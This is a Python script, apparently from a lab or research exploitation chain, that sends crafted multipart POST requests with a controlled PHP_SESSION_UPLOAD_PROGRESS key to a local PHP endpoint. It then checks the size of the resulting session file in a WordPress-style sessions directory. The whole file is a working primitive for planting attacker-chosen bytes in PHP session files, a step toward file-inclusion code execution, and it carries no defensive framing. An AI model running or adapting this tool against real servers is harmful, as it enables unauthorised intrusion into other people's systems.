#!/usr/bin/env python3
import http.client,sys,os,random,string,time,json
PORT=28893
def multipart(sid,key,path='/diag_params.php',fname=None,fdata=b'x',extra=None,cookie=True):
    b='----upmp'+''.join(random.choice(string.ascii_letters+string.digits) for _ in range(16))
    out=bytearray()
    def part(name,data,filename=None,ctype=None):
        out.extend(('--'+b+'\r\n').encode())
        if filename is None:
            out.extend(('Content-Disposition: form-data; name="%s"\r\n\r\n'%name).encode())
        else:
            out.extend(('Content-Disposition: form-data; name="%s"; filename="%s"\r\n'%(name,filename)).encode())
            if ctype: out.extend(('Content-Type: %s\r\n'%ctype).encode())
            out.extend(b'\r\n')
        out.extend(data); out.extend(b'\r\n')
    if not cookie: part('PHPSESSID',sid.encode())
    if extra:
        for n,d in extra: part(n,d)
    part('PHP_SESSION_UPLOAD_PROGRESS',key if isinstance(key,bytes) else key.encode())
    if fname is not None: part('f',fdata,filename=fname,ctype='application/octet-stream')
    out.extend(('--'+b+'--\r\n').encode())
    h={'Content-Type':'multipart/form-data; boundary='+b,'Content-Length':str(len(out))}
    if cookie: h['Cookie']='PHPSESSID='+sid
    c=http.client.HTTPConnection('127.0.0.1',PORT,timeout=180)
    t=time.time()
    c.request('POST',path,bytes(out),h); r=c.getresponse(); data=r.read(); c.close()
    return r.status,dict(r.getheaders()),data,time.time()-t,len(out)
if __name__=='__main__':
    mode=sys.argv[1]; sid=sys.argv[2]; path=sys.argv[3] if len(sys.argv)>3 else '/diag_params.php'
    if mode=='create':
        keylen=int(sys.argv[4]); fnamelen=int(sys.argv[5]); datalen=int(sys.argv[6]) if len(sys.argv)>6 else 1
        st,h,d,dt,bl=multipart(sid,b'K'*keylen,path,('N'*fnamelen).encode() if fnamelen>=0 else None,b'y'*datalen)
    elif mode=='create_key':
        key=bytes.fromhex(sys.argv[4]); fnamelen=int(sys.argv[5]); datalen=int(sys.argv[6]) if len(sys.argv)>6 else 1
        st,h,d,dt,bl=multipart(sid,key,path,('N'*fnamelen).encode() if fnamelen>=0 else None,b'y'*datalen)
    elif mode=='create_keyfile':
        key=open(sys.argv[4],'rb').read(); fnamelen=int(sys.argv[5]); datalen=int(sys.argv[6]) if len(sys.argv)>6 else 1
        st,h,d,dt,bl=multipart(sid,key,path,('N'*fnamelen).encode() if fnamelen>=0 else None,b'y'*datalen)
    elif mode=='trigger':
        st,h,d,dt,bl=multipart(sid,sys.argv[4] if len(sys.argv)>4 else 'x',path,b'f.bin',b'x')
    else: raise SystemExit('bad mode')
    sess='/tmp/opencode/research/realchain_20261022T015900Z/www/wp-content/uploads/sessions/sess_'+sid
    try: sz=os.path.getsize(sess)
    except FileNotFoundError: sz=None
    print(json.dumps({'status':st,'resp':d[:200].decode('latin1','replace'),'time':round(dt,3),'body_len':bl,'sess_size':sz,'headers':{k:v for k,v in h.items() if k.lower() in ('location','content-type','content-length')}},indent=1))
